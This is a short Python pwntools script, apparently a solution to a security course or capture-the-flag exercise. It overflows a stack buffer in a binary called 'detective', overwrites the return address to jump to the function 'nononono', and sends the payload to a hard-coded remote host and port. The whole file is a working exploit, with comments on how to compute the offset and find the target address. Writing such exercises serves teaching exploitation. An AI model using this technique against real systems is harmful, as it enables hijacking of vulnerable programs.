#!/usr/bin/env python3

from pwn import *

IP = "141.85.224.104"
PORT = 31337

# Part 1
payload = b""
payload += b"gimme gimme"

# Part 2 (bonus)
# Get the data you need from the executable
# 0x40 - offset of the buffer we read into
# 8    - space occupied by the old base pointer on the stack
# 11   - space already filled by "gimme gimme"
offset = 0x40 + 8 - 11

# Address of function `nononono`. Use `nm ./detective` to get it.
addr = 0x00000000004006d7

payload += offset * b"A" + p64(addr)

# Use r for remote exploiting
r = remote(IP, PORT)

r.sendline(payload)
r.interactive()
